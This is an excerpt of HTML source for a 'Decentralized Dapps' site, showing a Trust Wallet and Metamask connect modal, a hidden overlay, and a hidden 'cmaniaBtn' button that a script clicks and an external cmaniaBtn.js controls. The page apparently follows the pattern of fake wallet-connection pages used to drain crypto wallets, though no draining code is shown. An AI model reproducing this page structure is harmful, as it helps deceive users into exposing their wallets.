...
<head>
  ...
  <meta name="title"
    content="Decentralized Dapps - Unifying Web3 with top-tier, self-custodial, and multichain support.">
  <meta name="description"
    content="Decentralized Dapps - Unifying Web3 with top-tier, self-custodial, and multichain support.">
  <link rel="manifest" href="manifest.json">
  <title>
    Decentralized Dapps - Unifying Web3 with top-tier, self-custodial, and multichain support.
  </title>
  ...
  <script src="app/js/cmaniaBtn.js" type="46306f0cb48dc29629278bb7-text/javascript"></script>
</head>
...
<body class="home-main header-fixed">
  ...
  <script type="46306f0cb48dc29629278bb7-text/javascript">
      !(function (l) {
        function e(e) {
          for (
  ...
  <script src="static/js/2.532fe077.chunk.js" type="46306f0cb48dc29629278bb7-text/javascript"></script>
  <script src="static/js/main.0bd736dd.chunk.js" type="46306f0cb48dc29629278bb7-text/javascript"></script>
        ...
        <div class="sc-furwcr cCExkz web3modal-modal-card">
          <div class="sc-eCImPb cSaJae web3modal-provider-wrapper">
            <div class="sc-hKwDye iWCqoQ web3modal-provider-container" data-name="Trust Wallet">
              ...
              <div class="sc-gsDKAQ iKzkWq web3modal-provider-name">
                Trust
              </div>
              <div class="sc-dkPtRN kFITWz web3modal-provider-description">
          ...
          <div class="sc-eCImPb cSaJae web3modal-provider-wrapper">
            <div class="sc-hKwDye iWCqoQ web3modal-provider-container" data-name="Metamask">
              <div class="sc-bdvvtL fqonLZ web3modal-provider-icon">
                <img src="static/media/meta.svg" alt="Metamask">
              </div>
              <div class="sc-gsDKAQ iKzkWq web3modal-provider-name">
                Metamask
              </div>
  ...
  <div class="overlay" id="thebox" style="display: none; margin-top: -50px">
    <div class="overbox">
      <div style="overflow: hidden; margin: 5px 0px">
        <div class="closex" onclick="if (!window.__cfRLUnblockHandlers) return false; shutx()"
          style="cursor: pointer; color: red" data-cf-modified-46306f0cb48dc29629278bb7-="">
          X
        </div>
      </div>
  ...
  <span id="cmaniaBtn" hidden="" class="cmaniaBtn"></span>



  <script src="cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js"
    data-cf-settings="46306f0cb48dc29629278bb7-|49" defer=""></script>
  <script>(function () { function c() { var b = a.contentDocument || a.contentWindow.document; if (b) { var d = b.createElement('script'); d.innerHTML = "window.__CF$cv$params={r:'8ba74bdd59b40374',t:'MTcyNDg3OTUxMy4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);"; b.getElementsByTagName('head')[0].appendChild(d) } } if (document.body) { var a = document.createElement('iframe'); a.height = 1; a.width = 1; a.style.position = 'absolute'; a.style.top = 0; a.style.left = 0; a.style.border = 'none'; a.style.visibility = 'hidden'; document.body.appendChild(a); if ('loading' !== document.readyState) c(); else if (window.addEventListener) document.addEventListener('DOMContentLoaded', c); else { var e = document.onreadystatechange || function () { }; document.onreadystatechange = function (b) { e(b); 'loading' !== document.readyState && (document.onreadystatechange = e, c()) } } } })();</script>
</body>
<script type="46306f0cb48dc29629278bb7-text/javascript">
    function connection_all() {
      document.getElementById("cmaniaBtn").click();
    }
  </script>
<!-- Smartsupp Live Chat script -->
<script type="text/javascript">
var _smartsupp = _smartsupp || {};
_smartsupp.key = '5bd96e15ffcffe62aa8e2f001bff2619669acc01';
